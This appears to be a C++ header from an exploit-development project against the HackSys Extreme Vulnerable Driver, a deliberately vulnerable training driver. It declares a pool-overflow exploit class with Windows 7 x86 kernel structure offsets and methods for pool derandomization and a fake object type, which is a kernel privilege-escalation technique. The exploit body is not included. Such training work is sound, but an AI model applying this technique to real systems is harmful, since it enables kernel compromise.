#pragma once

#include "common.h"
#include "IExploit.h"
#include "HevdConstants.h"


//
// Structs for the Windows 7 x86 Enterprise, SP1 7601, English version.
//

// offset of nt!_OBJECT_TYPE.TypeIndex
#define OFFSET_OBJECT_TYPE_TYPE_INDEX 0x28

// offset of nt!_OBJECT_TYPE_INITIALIZER.OkayToCloseProcedure
#define OFFSET_OBJECT_TYPE_INITIALIZER_OKAY_TO_CLOSE 0x4c

typedef struct _POOL_HEADER {
	
	union {
		struct {
			unsigned long PreviousSize : 9;
			unsigned long PoolIndex : 7;
			unsigned long BlockSize : 9;
			unsigned long PoolType : 7;
		};
		unsigned long Ulong1;
	};
	
	unsigned long PoolTag;
	
} POOL_HEADER, *PPOOL_HEADER;


typedef struct _OBJECT_HEADER {
	
	unsigned long PointerCount;
	union {
		unsigned long HandleCount;
		void *NextToFree;
	};
	
	void* Lock;
	unsigned long TypeIndex;
	// ...
} OBJECT_HEADER, *POBJECT_HEADER;


typedef struct _OBJECT_HEADER_QUOTA {
	
	unsigned long PagedPoolCharge;
	unsigned long NonPagedPoolCharge;
	unsigned long SecurityDescriptorCharge;
	unsigned long SecurityDescriptorQuotaBlock;
	
} OBJECT_HEADER_QUOTA, *POBJECT_HEADER_QUOTA;



class ExploitPoolCorruption : public IExploit {
	
	static constexpr wchar_t *Exploit_Name 			= L"Pool Corruption";
	static constexpr DWORD Ioctl_Code				= HACKSYS_EVD_IOCTL_POOL_OVERFLOW;
	
	static constexpr size_t Max_Number_Of_Objects 	= 10000;

	unique_ptr<HANDLE[]> m_handles;
	bool m_afterCleanup;
	
public:
	ExploitPoolCorruption(Driver& driver) : IExploit(driver) {
		m_afterCleanup = false;
	}
	
	virtual ~ExploitPoolCorruption() { 
		handlesCleanup();
	}
	
	virtual const wchar_t* getName() const { 
		return ExploitPoolCorruption::Exploit_Name;
	};
	
	virtual DWORD getIoctlCode() const {
		return ExploitPoolCorruption::Ioctl_Code;
	}
	
	virtual bool exploit();
		
private:
	
	bool derandomizePool();
	bool setFakeObjectType();
	
	void handlesCleanup() {
		if(!m_afterCleanup && m_handles.get() != nullptr) {		
			for(size_t i = 0; i < Max_Number_Of_Objects; i++) {
				if(m_handles.get()[i] != INVALID_HANDLE_VALUE) {
					CloseHandle(m_handles.get()[i]);
				}
			}
			
			m_afterCleanup = true;
		}
	}
};
